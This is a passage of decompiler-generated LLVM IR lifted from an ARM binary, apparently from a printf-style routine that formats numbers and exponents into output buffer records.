  store i1 %v2_1145c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_110bc, i32* %lr.global-to-local, align 4
  %tmp213 = icmp slt i32 %v2_11448, 1
  br i1 %tmp213, label %.thread129, label %dec_label_pc_11470

.thread129:                                       ; preds = %dec_label_pc_11458
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_114e8

dec_label_pc_11470:                               ; preds = %dec_label_pc_11458
  store i32 ptrtoint (i32* @global_var_13487.396 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_1147c = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_1147c, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-148, align 4
  br label %dec_label_pc_114ec

bb214:                                            ; preds = %dec_label_pc_11444
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_114c8 = icmp slt i32 %v0_114dc, 0
  store i1 %v1_114c8, i1* %cpsr_n.global-to-local, align 1
  %v2_114c8 = icmp eq i32 %v0_114dc, 0
  store i1 %v2_114c8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_110bc, i32* %lr.global-to-local, align 4
  %tmp215 = icmp slt i32 %v0_114dc, 1
  br i1 %tmp215, label %dec_label_pc_114e8, label %dec_label_pc_114d8

dec_label_pc_114d8:                               ; preds = %bb214
  %v2_114dc = sub i32 %v2_11438, %v0_114dc
  store i32 %v2_114dc, i32* %r1.global-to-local, align 4
  %v2_114e0 = add i32 %v5_11424, %v0_114dc
  store i32 %v2_114e0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_114e8

dec_label_pc_114e8:                               ; preds = %dec_label_pc_114d8, %.thread129, %bb214
  %storemerge141.in = phi i32* [ %stack_var_-160, %bb214 ], [ %stack_var_-148, %.thread129 ], [ %stack_var_-148, %dec_label_pc_114d8 ]
  %v0_114fc82 = phi i32 [ %v2_11438, %bb214 ], [ 0, %.thread129 ], [ %v2_114dc, %dec_label_pc_114d8 ]
  %storemerge141 = ptrtoint i32* %storemerge141.in to i32
  store i32 %storemerge141, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_114ec

dec_label_pc_114ec:                               ; preds = %.thread127, %dec_label_pc_11470, %dec_label_pc_114e8
  %v1_1151c = phi i32 [ %v2_1147c, %dec_label_pc_11470 ], [ %storemerge141, %dec_label_pc_114e8 ], [ %v5_1143c, %.thread127 ]
  %v0_1153490 = phi i32 [ -1, %dec_label_pc_11470 ], [ -1, %dec_label_pc_114e8 ], [ %v0_114dc, %.thread127 ]
  %v0_114fc = phi i32 [ 0, %dec_label_pc_11470 ], [ %v0_114fc82, %dec_label_pc_114e8 ], [ %v2_11438, %.thread127 ]
  %v0_114ec = load i32, i32* %fp.global-to-local, align 4
  %v1_114ec = add i32 %v0_114ec, 12
  %v2_114ec = inttoptr i32 %v1_114ec to i32*
  %v3_114ec = load i32, i32* %v2_114ec, align 4
  %v1_114f0 = and i32 %v3_114ec, 16
  store i32 %v1_114f0, i32* %lr.global-to-local, align 4
  %v2_114f0 = icmp eq i32 %v1_114f0, 0
  %tmp238 = zext i1 %v2_114f0 to i32
  %.230 = xor i32 %tmp238, 1
  store i32 %.230, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_114fc = icmp slt i32 %v0_114fc, 0
  store i1 %v1_114fc, i1* %cpsr_n.global-to-local, align 1
  %v2_114fc = icmp eq i32 %v0_114fc, 0
  store i1 %v2_114fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_114fc, label %bb218, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_114ec
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11518

bb218:                                            ; preds = %dec_label_pc_114ec
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_114f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_114f0, label %dec_label_pc_1150c, label %dec_label_pc_11518

dec_label_pc_1150c:                               ; preds = %bb218
  %v0_1150c = load i32, i32* %r7.global-to-local, align 4
  %v1_1150c = add i32 %v0_1150c, -103
  %v3_1150c = sub i32 102, %v0_1150c
  %v4_1150c = and i32 %v3_1150c, %v0_1150c
  %v5_1150c = icmp slt i32 %v4_1150c, 0
  store i1 %v5_1150c, i1* %cpsr_v.global-to-local, align 1
  %v6_1150c = icmp slt i32 %v1_1150c, 0
  store i1 %v6_1150c, i1* %cpsr_n.global-to-local, align 1
  %v7_1150c = icmp eq i32 %v0_1150c, 103
  store i1 %v7_1150c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1150c, label %dec_label_pc_11534, label %bb219

bb219:                                            ; preds = %dec_label_pc_1150c
  %v1_11510 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_11510 = icmp slt i32 %v1_11510, 0
  store i1 %v2_11510, i1* %cpsr_n.global-to-local, align 1
  %v3_11510 = icmp eq i32 %v1_11510, 0
  store i1 %v3_11510, i1* %cpsr_z.global-to-local, align 1
  %tmp220 = icmp slt i32 %v1_11510, 1
  br i1 %tmp220, label %dec_label_pc_11534, label %dec_label_pc_11518

dec_label_pc_11518:                               ; preds = %.thread33, %bb218, %bb219
  %v2_1151c = inttoptr i32 %v1_1151c to i32*
  store i32 112, i32* %v2_1151c, align 4
  %v1_11524 = load i32, i32* %r6.global-to-local, align 4
  %v2_11524 = add i32 %v1_11524, 4
  %v3_11524 = inttoptr i32 %v2_11524 to i32*
  store i32 1, i32* %v3_11524, align 4
  store i32 ptrtoint (i32* @global_var_13494.398 to i32), i32* %r3.global-to-local, align 4
  %v1_1152c = load i32, i32* %r6.global-to-local, align 4
  %v2_1152c = add i32 %v1_1152c, 8
  %v3_1152c = inttoptr i32 %v2_1152c to i32*
  store i32 ptrtoint (i32* @global_var_13494.398 to i32), i32* %v3_1152c, align 4
  %v0_11530 = load i32, i32* %r6.global-to-local, align 4
  %v1_11530 = add i32 %v0_11530, 12
  store i32 %v1_11530, i32* %r6.global-to-local, align 4
  %v0_11534.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11534

dec_label_pc_11534:                               ; preds = %dec_label_pc_1150c, %bb219, %dec_label_pc_11518
  %v1_11540 = phi i32 [ %v1_1151c, %bb219 ], [ %v1_11530, %dec_label_pc_11518 ], [ %v1_1151c, %dec_label_pc_1150c ]
  %v0_11534 = phi i32 [ %v0_1153490, %bb219 ], [ %v0_11534.pre, %dec_label_pc_11518 ], [ %v0_1153490, %dec_label_pc_1150c ]
  %v1_11534 = add i32 %v0_11534, 1
  store i32 %v1_11534, i32* %ip.global-to-local, align 4
  %v3_11534 = sub i32 0, %v0_11534
  %v4_11534 = and i32 %v1_11534, %v3_11534
  %v5_11534 = icmp slt i32 %v4_11534, 0
  store i1 %v5_11534, i1* %cpsr_v.global-to-local, align 1
  %v6_11534 = icmp slt i32 %v1_11534, 0
  store i1 %v6_11534, i1* %cpsr_n.global-to-local, align 1
  %v7_11534 = icmp eq i32 %v1_11534, 0
  store i1 %v7_11534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11534, label %dec_label_pc_11558, label %dec_label_pc_1153c

dec_label_pc_1153c:                               ; preds = %dec_label_pc_11534
  %v1_1153c = sub i32 -1, %v0_11534
  %v2_11540 = add i32 %v1_11540, 4
  %v3_11540 = inttoptr i32 %v2_11540 to i32*
  store i32 %v1_1153c, i32* %v3_11540, align 4
  store i32 ptrtoint (i32* @global_var_13487.396 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_1154c = load i32, i32* %r6.global-to-local, align 4
  %v2_1154c = inttoptr i32 %v1_1154c to i32*
  store i32 176, i32* %v2_1154c, align 4
  %v0_11550 = load i32, i32* %r3.global-to-local, align 4
  %v1_11550 = load i32, i32* %r6.global-to-local, align 4
  %v2_11550 = add i32 %v1_11550, 8
  %v3_11550 = inttoptr i32 %v2_11550 to i32*
  store i32 %v0_11550, i32* %v3_11550, align 4
  %v0_11554 = load i32, i32* %r6.global-to-local, align 4
  %v1_11554 = add i32 %v0_11554, 12
  store i32 %v1_11554, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11558

dec_label_pc_11558:                               ; preds = %dec_label_pc_11534, %dec_label_pc_1153c
  %v2_11560 = phi i32 [ %v1_11540, %dec_label_pc_11534 ], [ %v1_11554, %dec_label_pc_1153c ]
  %v0_11558 = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11558 = icmp slt i32 %v0_11558, 0
  store i1 %v1_11558, i1* %cpsr_n.global-to-local, align 1
  %v2_11558 = icmp eq i32 %v0_11558, 0
  store i1 %v2_11558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11558, label %.thread42, label %bb221

bb221:                                            ; preds = %dec_label_pc_11558
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_11560 = inttoptr i32 %v2_11560 to i32*
  store i32 112, i32* %v3_11560, align 4
  %v1_11564 = load i32, i32* %r4.global-to-local, align 4
  %v2_11564 = load i32, i32* %r6.global-to-local, align 4
  %v3_11564 = add i32 %v2_11564, 8
  %v4_11564 = inttoptr i32 %v3_11564 to i32*
  store i32 %v1_11564, i32* %v4_11564, align 4
  %v1_11568 = load i32, i32* %r1.global-to-local, align 4
  %v2_11568 = load i32, i32* %r6.global-to-local, align 4
  %v3_11568 = add i32 %v2_11568, 4
  %v4_11568 = inttoptr i32 %v3_11568 to i32*
  store i32 %v1_11568, i32* %v4_11568, align 4
  %v1_1156c = load i32, i32* %r6.global-to-local, align 4
  %v2_1156c = add i32 %v1_1156c, 12
  store i32 %v2_1156c, i32* %r6.global-to-local, align 4
  br label %.thread42

.thread42:                                        ; preds = %dec_label_pc_11558, %bb221
  %v1_11590 = phi i32 [ %v2_11560, %dec_label_pc_11558 ], [ %v2_1156c, %bb221 ]
  %v0_11570 = load i32, i32* %r7.global-to-local, align 4
  %v1_11570 = add i32 %v0_11570, -103
  %v3_11570 = sub i32 102, %v0_11570
  %v4_11570 = and i32 %v3_11570, %v0_11570
  %v5_11570 = icmp slt i32 %v4_11570, 0
  store i1 %v5_11570, i1* %cpsr_v.global-to-local, align 1
  %v6_11570 = icmp slt i32 %v1_11570, 0
  store i1 %v6_11570, i1* %cpsr_n.global-to-local, align 1
  %v7_11570 = icmp eq i32 %v0_11570, 103
  store i1 %v7_11570, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11570, label %dec_label_pc_11578, label %dec_label_pc_11580

dec_label_pc_11578:                               ; preds = %.thread42
  %v0_11578 = load i32, i32* %lr.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11578 = icmp slt i32 %v0_11578, 0
  store i1 %v1_11578, i1* %cpsr_n.global-to-local, align 1
  %v2_11578 = icmp eq i32 %v0_11578, 0
  store i1 %v2_11578, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11578, label %dec_label_pc_115a8, label %dec_label_pc_11580

dec_label_pc_11580:                               ; preds = %.thread42, %dec_label_pc_11578
  %v0_11580 = load i32, i32* %ip.global-to-local, align 4
  %v1_11580 = load i32, i32* %r1.global-to-local, align 4
  %v2_11580 = sub i32 %v1_11580, %v0_11580
  store i32 %v2_11580, i32* %r3.global-to-local, align 4
  %v1_11584 = load i32, i32* %r8.global-to-local, align 4
  %v2_11584 = sub i32 %v2_11580, %v1_11584
  %v4_11584 = xor i32 %v1_11584, %v2_11580
  %v5_11584 = xor i32 %v2_11584, %v2_11580
  %v6_11584 = and i32 %v5_11584, %v4_11584
  %v7_11584 = icmp slt i32 %v6_11584, 0
  store i1 %v7_11584, i1* %cpsr_v.global-to-local, align 1
  %v8_11584 = icmp slt i32 %v2_11584, 0
  store i1 %v8_11584, i1* %cpsr_n.global-to-local, align 1
  %v9_11584 = icmp eq i32 %v2_11580, %v1_11584
  store i1 %v9_11584, i1* %cpsr_z.global-to-local, align 1
  %v2_11588 = xor i1 %v8_11584, %v7_11584
  br i1 %v2_11588, label %dec_label_pc_1158c, label %dec_label_pc_115a8

dec_label_pc_1158c:                               ; preds = %dec_label_pc_11580
  %v2_1158c = sub i32 %v1_11584, %v2_11580
  %v2_11590 = add i32 %v1_11590, 4
  %v3_11590 = inttoptr i32 %v2_11590 to i32*
  store i32 %v2_1158c, i32* %v3_11590, align 4
  store i32 ptrtoint (i32* @global_var_13487.396 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_1159c = load i32, i32* %r6.global-to-local, align 4
  %v2_1159c = inttoptr i32 %v1_1159c to i32*
  store i32 176, i32* %v2_1159c, align 4
  %v0_115a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_115a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_115a0 = add i32 %v1_115a0, 8
  %v3_115a0 = inttoptr i32 %v2_115a0 to i32*
  store i32 %v0_115a0, i32* %v3_115a0, align 4
  %v0_115a4 = load i32, i32* %r6.global-to-local, align 4
  %v1_115a4 = add i32 %v0_115a4, 12
  store i32 %v1_115a4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_115a8

dec_label_pc_115a8:                               ; preds = %dec_label_pc_11580, %dec_label_pc_11578, %dec_label_pc_1158c
  %v1_1163c.pre.pre = phi i32 [ %v1_11590, %dec_label_pc_11580 ], [ %v1_11590, %dec_label_pc_11578 ], [ %v1_115a4, %dec_label_pc_1158c ]
  %v0_115a8 = load i32, i32* %sl.global-to-local, align 4
  %v1_115a8 = add i32 %v0_115a8, -102
  %v3_115a8 = sub i32 101, %v0_115a8
  %v4_115a8 = and i32 %v3_115a8, %v0_115a8
  %v5_115a8 = icmp slt i32 %v4_115a8, 0
  store i1 %v5_115a8, i1* %cpsr_v.global-to-local, align 1
  %v6_115a8 = icmp slt i32 %v1_115a8, 0
  store i1 %v6_115a8, i1* %cpsr_n.global-to-local, align 1
  %v7_115a8 = icmp eq i32 %v0_115a8, 102
  store i1 %v7_115a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_115a8, label %dec_label_pc_11630, label %dec_label_pc_115b0

dec_label_pc_115b0:                               ; preds = %dec_label_pc_115a8
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_115b4 = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_115b4 = icmp slt i32 %v0_115b4, 0
  store i1 %v1_115b4, i1* %cpsr_n.global-to-local, align 1
  %v2_115b4 = icmp eq i32 %v0_115b4, 0
  store i1 %v2_115b4, i1* %cpsr_z.global-to-local, align 1
  %v4_115b8 = zext i8 %stack_var_-66.0108114 to i32
  store i32 %v4_115b8, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-51, align 4
  %v4_115c8 = sub i32 0, %v0_115b4
  %storemerge140 = select i1 %v1_115b4, i32 %v4_115c8, i32 %v0_115b4
  %tmp239 = ashr i32 %v0_115b4, 31
  %tmp240 = and i32 %tmp239, 2
  %tmp241 = add nuw nsw i32 %tmp240, 43
  store i32 %storemerge140, i32* %r4.global-to-local, align 4
  store i32 %tmp241, i32* %sl.global-to-local, align 4
  %v2_115d0 = ptrtoint i32* %stack_var_-51 to i32
  store i32 %v2_115d0, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_115d8

dec_label_pc_115d8:                               ; preds = %dec_label_pc_11608, %dec_label_pc_115d8, %dec_label_pc_115b0
  %v2_115f0 = phi i32 [ %v2_115d0, %dec_label_pc_115b0 ], [ %v6_115f0, %dec_label_pc_115d8 ], [ %v6_115f0, %dec_label_pc_11608 ]
  %v0_115ec = phi i32 [ %storemerge140, %dec_label_pc_115b0 ], [ %v2_115f4, %dec_label_pc_115d8 ], [ %v2_115f4, %dec_label_pc_11608 ]
  %v2_115e0 = srem i32 %v0_115ec, 10
  %v1_115e4 = add nsw i32 %v2_115e0, 48
  store i32 %v1_115e4, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v0_115ec, i32* %r0.global-to-local, align 4
  %v1_115f0 = trunc i32 %v1_115e4 to i8
  %v3_115f0 = add i32 %v2_115f0, -1
  %v4_115f0 = inttoptr i32 %v3_115f0 to i8*
  store i8 %v1_115f0, i8* %v4_115f0, align 1
  %v5_115f0 = load i32, i32* %r5.global-to-local, align 4
  %v6_115f0 = add i32 %v5_115f0, -1
  store i32 %v6_115f0, i32* %r5.global-to-local, align 4
  %v0_115f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_115f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_115f4 = sdiv i32 %v0_115f4, %v1_115f4
  store i32 %v2_115f4, i32* %r0.global-to-local, align 4
  %v0_115f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_115f8 = add i32 %v0_115f8, 1
  store i32 %v1_115f8, i32* %r7.global-to-local, align 4
  %v1_115fc = add i32 %v0_115f8, -2
  %v3_115fc = sub i32 1, %v0_115f8
  %v4_115fc = and i32 %v3_115fc, %v1_115f8
  %v5_115fc = icmp slt i32 %v4_115fc, 0
  store i1 %v5_115fc, i1* %cpsr_v.global-to-local, align 1
  %v6_115fc = icmp slt i32 %v1_115fc, 0
  store i1 %v6_115fc, i1* %cpsr_n.global-to-local, align 1
  %v7_115fc = icmp eq i32 %v1_115f8, 3
  store i1 %v7_115fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_115f4, i32* %r4.global-to-local, align 4
  %v7_11604 = icmp slt i32 %v1_115f8, 4
  br i1 %v7_11604, label %dec_label_pc_115d8, label %dec_label_pc_11608

dec_label_pc_11608:                               ; preds = %dec_label_pc_115d8
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11608 = icmp slt i32 %v2_115f4, 0
  store i1 %v1_11608, i1* %cpsr_n.global-to-local, align 1
  %v2_11608 = icmp eq i32 %v2_115f4, 0
  store i1 %v2_11608, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11608, label %dec_label_pc_11610, label %dec_label_pc_115d8

dec_label_pc_11610:                               ; preds = %dec_label_pc_11608
  %v1_11610 = add i32 %v5_115f0, -2
  store i32 %v1_11610, i32* %r3.global-to-local, align 4
  %v0_11614 = load i32, i32* %sl.global-to-local, align 4
  %v1_11614 = trunc i32 %v0_11614 to i8
  %v4_11614 = inttoptr i32 %v1_11610 to i8*
  store i8 %v1_11614, i8* %v4_11614, align 1
  %v0_11618 = load i32, i32* %r3.global-to-local, align 4
  %v1_11618 = add i32 %v0_11618, -1
  store i32 %v1_11618, i32* %r2.global-to-local, align 4
  %v0_1161c = load i32, i32* %r8.global-to-local, align 4
  %v1_1161c = trunc i32 %v0_1161c to i8
  %v4_1161c = inttoptr i32 %v1_11618 to i8*
  store i8 %v1_1161c, i8* %v4_1161c, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_11624 = load i32, i32* %r6.global-to-local, align 4
  %v1_11624 = inttoptr i32 %v0_11624 to i32*
  store i32 112, i32* %v1_11624, align 4
  %v3_11624 = add i32 %v0_11624, 4
  %v4_11624 = inttoptr i32 %v3_11624 to i32*
  %v5_11624 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_11624, i32* %v4_11624, align 4
  %v0_11628 = load i32, i32* %r2.global-to-local, align 4
  %v1_11628 = load i32, i32* %r6.global-to-local, align 4
  %v2_11628 = add i32 %v1_11628, 8
  %v3_11628 = inttoptr i32 %v2_11628 to i32*
  store i32 %v0_11628, i32* %v3_11628, align 4
  %v0_1162c = load i32, i32* %r6.global-to-local, align 4
  %v1_1162c = add i32 %v0_1162c, 12
  store i32 %v1_1162c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11630

dec_label_pc_11630:                               ; preds = %dec_label_pc_115a8, %.thread105, %dec_label_pc_11610
  %v1_1163c.pre = phi i32 [ %v2_111a8, %.thread105 ], [ %v1_1162c, %dec_label_pc_11610 ], [ %v1_1163c.pre.pre, %dec_label_pc_115a8 ]
  %v2_11630 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_11630, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11634

dec_label_pc_11634:                               ; preds = %dec_label_pc_11634, %dec_label_pc_11630
  %v0_11634 = phi i32 [ %v2_11630, %dec_label_pc_11630 ], [ %v4_11634, %dec_label_pc_11634 ]
  %stack_var_-188.0 = phi i32 [ %v3_110e0, %dec_label_pc_11630 ], [ %v2_11640, %dec_label_pc_11634 ]
  %v1_11634 = inttoptr i32 %v0_11634 to i32*
  %v2_11634 = load i32, i32* %v1_11634, align 4
  store i32 %v2_11634, i32* %r3.global-to-local, align 4
  %v4_11634 = add i32 %v0_11634, 12
  store i32 %v4_11634, i32* %r2.global-to-local, align 4
  %v3_1163c = icmp ult i32 %v4_11634, %v1_1163c.pre
  %v2_11640 = sub i32 %stack_var_-188.0, %v2_11634
  store i32 %v2_11640, i32* %ip.global-to-local, align 4
  br i1 %v3_1163c, label %dec_label_pc_11634, label %dec_label_pc_1164c

dec_label_pc_1164c:                               ; preds = %dec_label_pc_11634
  %v3_1164c = load i8, i8* %stack_var_-50, align 1
  %v4_1164c = sext i8 %v3_1164c to i32
  store i32 %v4_1164c, i32* %r3.global-to-local, align 4
  store i32 %v4_1164c, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11650 = icmp slt i8 %v3_1164c, 0
  store i1 %v1_11650, i1* %cpsr_n.global-to-local, align 1
  %v2_11650 = icmp eq i8 %v3_1164c, 0
  store i1 %v2_11650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11650, label %bb226, label %bb225

bb225:                                            ; preds = %dec_label_pc_1164c
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %dec_label_pc_1164c, %bb225
  %v1_1169c = phi i32 [ %v4_1164c, %dec_label_pc_1164c ], [ 1, %bb225 ]
  %v2_11658 = sub i32 %v2_11640, %v1_1169c
  store i32 %v2_11658, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_11660 = ptrtoint i8* %stack_var_-50 to i32
  store i32 %v2_11660, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11664 = icmp slt i32 %v2_11658, 0
  store i1 %v1_11664, i1* %cpsr_n.global-to-local, align 1
  %v2_11664 = icmp eq i32 %v2_11658, 0
  store i1 %v2_11664, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-184, align 4
  %tmp227 = icmp slt i32 %v2_11658, 1
  br i1 %tmp227, label %dec_label_pc_116c4, label %dec_label_pc_11678

dec_label_pc_11678:                               ; preds = %bb226
  %v0_11678 = load i32, i32* %fp.global-to-local, align 4
  %v1_11678 = add i32 %v0_11678, 12
  %v2_11678 = inttoptr i32 %v1_11678 to i32*
  %v3_11678 = load i32, i32* %v2_11678, align 4
  store i32 %v3_11678, i32* %r3.global-to-local, align 4
  %v1_1167c = and i32 %v3_11678, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1167c = icmp eq i32 %v1_1167c, 0
  store i1 %v2_1167c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1167c, label %dec_label_pc_11694, label %dec_label_pc_11684

dec_label_pc_11684:                               ; preds = %dec_label_pc_11678
  store i32 ptrtoint (i32* @global_var_13487.396 to i32), i32* %r3.global-to-local, align 4
  %v1_11688 = add i32 %v1_1163c.pre, 12
  store i32 %v1_11688, i32* %r5.global-to-local, align 4
  %v1_1168c = inttoptr i32 %v1_1163c.pre to i32*
  store i32 160, i32* %v1_1168c, align 4
  %v3_1168c = add i32 %v1_1163c.pre, 4
  %v4_1168c = inttoptr i32 %v3_1168c to i32*
  %v5_1168c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1168c, i32* %v4_1168c, align 4
  %v6_1168c = add i32 %v1_1163c.pre, 8
  %v7_1168c = inttoptr i32 %v6_1168c to i32*
  %v8_1168c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_1168c, i32* %v7_1168c, align 4
  br label %dec_label_pc_116c8

dec_label_pc_11694:                               ; preds = %dec_label_pc_11678
  %v1_11694 = add i32 %v0_11678, 16
  %v2_11694 = inttoptr i32 %v1_11694 to i32*
  %v3_11694 = load i32, i32* %v2_11694, align 4
  store i32 %v3_11694, i32* %r3.global-to-local, align 4
  %v1_11698 = add i32 %v3_11694, -48
  %v3_11698 = sub i32 47, %v3_11694
  %v4_11698 = and i32 %v3_11698, %v3_11694
  %v5_11698 = icmp slt i32 %v4_11698, 0
  store i1 %v5_11698, i1* %cpsr_v.global-to-local, align 1
  %v6_11698 = icmp slt i32 %v1_11698, 0
  store i1 %v6_11698, i1* %cpsr_n.global-to-local, align 1
  %v7_11698 = icmp eq i32 %v3_11694, 48
  store i1 %v7_11698, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11698, label %dec_label_pc_116a8, label %bb228

bb228:                                            ; preds = %dec_label_pc_11694
  store i32 %v2_11640, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_116c4

dec_label_pc_116a8:                               ; preds = %dec_label_pc_11694
  %v3_116a8 = load i32, i32* %stack_var_-168, align 4
  store i32 %v1_1163c.pre, i32* %r5.global-to-local, align 4
  %v2_116b0 = add i32 %v3_116a8, %v2_11658
  store i32 %v2_116b0, i32* %r3.global-to-local, align 4
  store i32 %v2_116b0, i32* %stack_var_-168, align 4
  br label %dec_label_pc_116c8

dec_label_pc_116bc:                               ; preds = %dec_label_pc_116d0
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11700

dec_label_pc_116c4:                               ; preds = %bb228, %bb226
  store i32 %v1_1163c.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_116c8

dec_label_pc_116c8:                               ; preds = %dec_label_pc_116a8, %dec_label_pc_11684, %dec_label_pc_116c4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_110bc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_116d0

dec_label_pc_116d0:                               ; preds = %dec_label_pc_116f8, %dec_label_pc_116c8
  %v0_116d0 = phi i32 [ %v1_116f0, %dec_label_pc_116f8 ], [ %v2_110bc, %dec_label_pc_116c8 ]
  %v1_116d0 = inttoptr i32 %v0_116d0 to i32*
  %v2_116d0 = load i32, i32* %v1_116d0, align 4
  store i32 %v2_116d0, i32* %r1.global-to-local, align 4
  %v3_116d0 = add i32 %v0_116d0, 4
  %v4_116d0 = inttoptr i32 %v3_116d0 to i32*
  %v5_116d0 = load i32, i32* %v4_116d0, align 4
  store i32 %v5_116d0, i32* %r2.global-to-local, align 4
  %v6_116d0 = add i32 %v0_116d0, 8
  %v7_116d0 = inttoptr i32 %v6_116d0 to i32*
  %v8_116d0 = load i32, i32* %v7_116d0, align 4
  store i32 %v8_116d0, i32* %r3.global-to-local, align 4
  %v2_116d4 = load i32, i32* %stack_var_-192, align 4
  store i32 %v2_116d4, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* %ip.global-to-local, align 4
  store i32 71396, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_116e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_116e4 = add i32 %v0_116e4, 4
  %v2_116e4 = inttoptr i32 %v1_116e4 to i32*
  %v3_116e4 = load i32, i32* %v2_116e4, align 4
  store i32 %v3_116e4, i32* %r3.global-to-local, align 4
  %v0_116e8 = load i32, i32* %r0.global-to-local, align 4
  %v2_116e8 = sub i32 %v0_116e8, %v3_116e4
  %v4_116e8 = xor i32 %v0_116e8, %v3_116e4
  %v5_116e8 = xor i32 %v2_116e8, %v0_116e8
  %v6_116e8 = and i32 %v5_116e8, %v4_116e8
  %v7_116e8 = icmp slt i32 %v6_116e8, 0
  store i1 %v7_116e8, i1* %cpsr_v.global-to-local, align 1
  %v8_116e8 = icmp slt i32 %v2_116e8, 0
  store i1 %v8_116e8, i1* %cpsr_n.global-to-local, align 1
  %v9_116e8 = icmp eq i32 %v0_116e8, %v3_116e4
  store i1 %v9_116e8, i1* %cpsr_z.global-to-local, align 1
  %v0_116ec = load i32, i32* %r6.global-to-local, align 4
  %v2_116ec = add i32 %v0_116ec, %v0_116e8
  store i32 %v2_116ec, i32* %r6.global-to-local, align 4
  %v1_116f0 = add i32 %v0_116e4, 12
  store i32 %v1_116f0, i32* %r4.global-to-local, align 4
  br i1 %v9_116e8, label %dec_label_pc_116f8, label %dec_label_pc_116bc

dec_label_pc_116f8:                               ; preds = %dec_label_pc_116d0
  %v1_116f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_116f8 = sub i32 %v1_116f0, %v1_116f8
  %v3_116f8 = icmp ult i32 %v1_116f0, %v1_116f8
  %v4_116f8 = xor i32 %v1_116f8, %v1_116f0
  %v5_116f8 = xor i32 %v2_116f8, %v1_116f0
  %v6_116f8 = and i32 %v5_116f8, %v4_116f8
  %v7_116f8 = icmp slt i32 %v6_116f8, 0
  store i1 %v7_116f8, i1* %cpsr_v.global-to-local, align 1
  %v8_116f8 = icmp slt i32 %v2_116f8, 0
  store i1 %v8_116f8, i1* %cpsr_n.global-to-local, align 1
  %v9_116f8 = icmp eq i32 %v1_116f0, %v1_116f8
  store i1 %v9_116f8, i1* %cpsr_z.global-to-local, align 1
